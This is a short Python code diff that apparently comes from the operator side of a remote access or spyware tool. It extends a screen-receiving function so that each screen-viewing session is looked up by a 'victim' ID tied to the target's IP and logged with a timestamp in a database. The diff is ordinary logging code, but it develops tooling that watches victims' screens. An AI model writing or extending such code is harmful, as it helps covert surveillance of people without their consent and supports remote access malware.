@@ -4,7 +4,8 @@ import socket
 import zlib
 import threading
 import select
-
+from datetime import datetime
+from database.connect.connect import *
 
 def recvall(sock, size):
     buf = b''
@@ -127,4 +128,8 @@ def screenreceiver(host, port=5001):
     receiver = ScreenReceiver(host, port)
     receiver.start()
     threading.Thread(target=receiver.update_screen, daemon=True).start()
+    execution_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    victimid = get_victimid_by_ip(host)
+    conn = connect_to_database()
+    insert_log(conn, victimid, "Screen", execution_time)
     return receiver
